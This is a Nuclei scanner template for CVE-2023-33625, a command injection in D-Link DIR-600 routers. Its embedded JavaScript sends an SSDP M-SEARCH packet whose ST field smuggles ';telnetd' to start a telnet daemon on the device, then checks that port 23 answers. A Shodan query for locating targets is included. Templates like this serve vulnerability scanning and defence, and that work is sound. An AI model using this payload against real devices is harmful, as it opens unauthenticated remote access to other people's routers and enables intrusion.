id: CVE-2023-33625
info:
  author: gy741
  classification:
    cpe: cpe:2.3:o:dlink:dir-600_firmware:2.18:*:*:*:*:*:*:*
    cve-id: CVE-2023-33625
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-77
    epss-percentile: 0.35547
    epss-score: 0.00085
  description: 'D-Link DIR-600 Hardware Version B5, Firmware Version 2.18 was discovered
    to contain a command injection vulnerability via the ST parameter in the lxmldbc_system()
    function.

    '
  metadata:
    max-request: 1
    shodan-query: DIR-600
    verified: true
  name: D-link DIR-600 - Unauthenticated Remote Code Execution
  reference:
  - https://nvd.nist.gov/vuln/detail/CVE-2023-33625
  - https://hackmd.io/@naihsin/By2datZD2
  - https://github.com/naihsin/IoT/blob/main/D-Link/DIR-600/cmd%20injection/README.md
  severity: critical
  tags: cve,cve2023,rce,js,dlink
javascript:
- args:
    Host: '{{Host}}'
    Port: 1900
  code: 'let message = ''M-SEARCH * HTTP/1.1\r\n'' +

    ''HOST: '' + `${Host}:${Port}` + ''\r\n'' +

    ''ST: urn:device:1;telnetd\r\n'' +

    ''MX: 2\r\n'' +

    ''MAN: "ssdp:discover"\r\n\r\n'';

    let packet = bytes.NewBuffer();

    packet.WriteString(message)

    let c = require("nuclei/net");

    let conn = c.Open(''udp'', `${Host}:${Port}`);

    conn.SendHex(packet.Hex());

    for(var start = new Date().getTime(); new Date().getTime() < start + 3000;);

    '
- args:
    Host: '{{Host}}'
    Port: 23
  code: 'let m = require(''nuclei/telnet'');

    let c = m.TelnetClient();

    a = c.IsTelnet(Host, Port);

    to_json(a);

    '
  matchers:
  - type: word
    words:
    - '"IsTelnet": true'
  - dsl:
    - success == true
    type: dsl
  matchers-condition: and
